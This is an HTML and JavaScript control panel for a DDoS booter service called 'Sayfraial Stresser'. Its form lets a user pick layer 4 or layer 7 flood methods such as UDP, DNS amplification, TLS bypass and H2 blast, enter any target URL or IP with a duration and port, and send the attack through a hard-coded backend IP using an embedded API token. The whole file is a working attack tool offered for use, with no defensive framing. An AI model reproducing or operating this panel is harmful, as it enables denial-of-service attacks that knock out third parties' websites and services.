<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sayfraial Stresser</title>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #0f0f0f;
      color: #fff;
    }
    .container {
      padding: 2rem;
      max-width: 700px;
      margin: auto;
    }
    .btn {
      padding: 10px 20px;
      background: #007bff;
      color: white;
      border: none;
      margin-top: 10px;
      cursor: pointer;
    }
    select, input {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      margin-bottom: 15px;
      background: #1a1a1a;
      color: white;
      border: 1px solid #444;
    }
    .theme-toggle {
      position: absolute;
      top: 10px;
      right: 20px;
      cursor: pointer;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="theme-toggle" onclick="toggleTheme()">üåô Dark/Light</div>
  <div class="container">
    <h1>Sayfraial Stresser</h1>
    <p>‚ö° Powerful & Private Web Stresser by <strong>sayfraial</strong></p>

    <h2>üöÄ Launch Attack</h2>
    <label>Layer:</label>
    <select id="layer" onchange="loadMethods()">
      <option value="layer7">L7</option>
      <option value="layer4">L4</option>
    </select>

    <label>Method:</label>
    <select id="method"></select>

    <input type="text" id="target" placeholder="üåê Target (URL/IP)" />
    <input type="number" id="time" placeholder="‚è±Ô∏è Duration (seconds)" />
    <input type="number" id="port" placeholder="üîå Port (optional)" />

    <button class="btn" onclick="sendAttack()">üî• Attack</button>

    <div id="result" style="margin-top: 20px;"></div>
  </div>

  <script>
    const methods = {
      layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"],
      layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"]
    };

    function loadMethods() {
      const layer = document.getElementById('layer').value;
      const methodSelect = document.getElementById('method');
      methodSelect.innerHTML = '';
      methods[layer].forEach(m => {
        const opt = document.createElement('option');
        opt.value = m;
        opt.innerText = m.toUpperCase();
        methodSelect.appendChild(opt);
      });
    }

    function sendAttack() {
      const layer = document.getElementById('layer').value;
      const method = document.getElementById('method').value;
      const target = document.getElementById('target').value;
      const time = document.getElementById('time').value;
      const port = document.getElementById('port').value;

      if (!target || !time || !method) {
        alert('‚ùå Please fill all required fields!');
        return;
      }

      const apiUrl = `http://37.27.169.207:20835/api/attack?token=kobosky&target=${encodeURIComponent(target)}&time=${time}&method=${method}&port=${port}`;
      document.getElementById('result').innerText = "Sending attack...";

      axios.get(apiUrl)
        .then(res => {
          document.getElementById('result').innerText = "‚úÖ Attack sent: " + JSON.stringify(res.data);
        })
        .catch(err => {
          document.getElementById('result').innerText = "‚ùå Error: " + (err.response?.data || err.message);
        });
    }

    function toggleTheme() {
      const html = document.documentElement;
      const current = html.getAttribute('data-theme');
      const next = current === 'dark' ? 'light' : 'dark';
      html.setAttribute('data-theme', next);
      document.body.style.background = next === 'dark' ? '#0f0f0f' : '#f5f5f5';
      document.body.style.color = next === 'dark' ? 'white' : 'black';
    }

    loadMethods(); // init
  </script>
</body>
</html>
